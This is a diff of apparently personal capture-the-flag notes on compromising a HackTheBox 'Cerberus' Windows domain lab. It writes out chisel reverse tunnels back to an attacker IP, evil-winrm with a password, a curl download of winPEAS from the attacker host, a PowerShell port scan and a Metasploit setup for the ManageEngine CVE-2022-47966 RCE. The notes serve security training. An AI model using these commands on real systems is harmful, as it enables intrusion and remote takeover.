@@ -1,5 +1,6 @@
 http://icinga.cerberus.local:8080/icingaweb2
 
+
 it is redirecting to icinga
 
 adding to /etc/hosts website opens
@@ -152,7 +153,7 @@ using evilwinrm
 
 https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/
 
-proxychains evil-winrm -u matthew -p 147258269 -i 172.16.22.1
+proxychains evil-winrm -u matthew -p 147258369 -i 172.16.22.1
 
 trying evil winrm on dc with prooxychains
 
@@ -161,7 +162,7 @@ https://hack.technoherder.com/chisel/
 sudo ./chisel server -p 8081 --reverse 
 - on attacker
 
-./chisel client 10.10.16.24:8001 R:1080:socks
+./chisel client 10.10.16.24:8081 R:socks
  - on victim
 
 on attacker
@@ -170,4 +171,87 @@ sudo nano /etc/proxychains4.conf
 socks5   127.0.0.1   1080
 
 how to add attacker ot proxychains is what i need to look into
+
+-i 172.16.22.1
+
+trying evil winrm on dc with prooxychains
+
+https://hack.technoherder.com/chisel/
+
+sudo ./chisel server -p 8081 --reverse 
+- on attacker
+
+./chisel client 10.10.16.24:8081 R:socks
+ - on victim
+
+on attacker
+sudo nano /etc/proxychains4.conf
+
+`socks5   127.0.0.1   1080`
+
+how to add attacker ot proxychains is what i need to look into
+
+this worked
+
+![](20230625055044.png)
+
+got user flag
+
+curl http://10.10.16.24:8000/winpeas.ps1 -o winpeas.ps1
+
+https://medium.com/@satyasangwal/cerberus-htb-machine-40b8070b9d05
+
+
+1..10000 | % {echo ((new-object Net.Sockets.TcpClient).Connect(“10.10.11.205”,$_)) “Port $_ is open!”} 2>$null
+
+`1..10000 | % {echo ((new-object Net.Sockets.TcpClient).Connect('10.10.11.205',$_)) "Port $_ is open!"} 2>$null`
+
+to see which port are open
+
+these can then be porsted back
+
+/chisel.exe client 10.10.16.24:8001 R:80localhost:80 R:443:localhost:443 R:8888:localhost:8888 R:9251:localhost:9251
+
+127.0.0.1 iceinga.cerberus.local iceinga
+127.0.1.1 localhost
+172.16.22.1 DC.cerberus.local DC cerberus.local
+
+### running multiple chisel endpoints with proxy
+https://hack.technoherder.com/chisel/
+
+for socks 5 need to disable strict chain
+
+.\chisel.exe client 10.10.16.24:8002 R:3080:socks
+
+and in config
+socks5 127.0.0.1 3080
+
+### another thing we can do simple port forwarding without proxy
+
+./chisel.exe client 10.10.16.24:8002 R:80:localhost:80 R:443:localhost:443 R:8888:localhost:8888 R:9251:localhost:9251
+
+sudo ./chisel server -p 8082 --reverse 
+
+> both are not working
+
+and then using this we can get access to the website at
+
+https://dc.cerberus.local
+
+and get the guid
+
+67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
+
+we can use 
+
+`use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966`
+set issuer_url http://dc.cerberus.local/adfs/services/trust
+set rhosts 127.0.0.1
+set lhost 10.10.16.24
+set lport 7777
+exploit
+
+
+this might be different for different people
+
 
